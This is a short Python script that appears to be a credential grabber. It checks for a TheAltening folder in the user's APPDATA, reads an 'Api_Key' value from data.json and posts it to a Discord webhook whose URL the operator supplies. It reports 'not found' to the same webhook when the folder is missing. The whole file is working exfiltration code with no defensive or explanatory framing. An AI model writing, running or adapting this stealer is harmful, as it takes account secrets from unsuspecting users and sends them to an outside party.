import os
import re
import json
from discord_webhook import DiscordWebhook, DiscordEmbed
from urllib.request import Request, urlopen
import os.path
from os import path
import json
#enter you webhook url here
WEBHOOK_URL = ""


roaming = os.getenv('APPDATA')


OBS = roaming + '\\altening\\'

if path.exists(f"{OBS}"):
    with open('data.json') as c:
        config = json.load(c)
    API = config.get("Api_Key")
    
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```json\n{API}```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**API** ```json\n API key Not Found```"))
    response = f.execute()

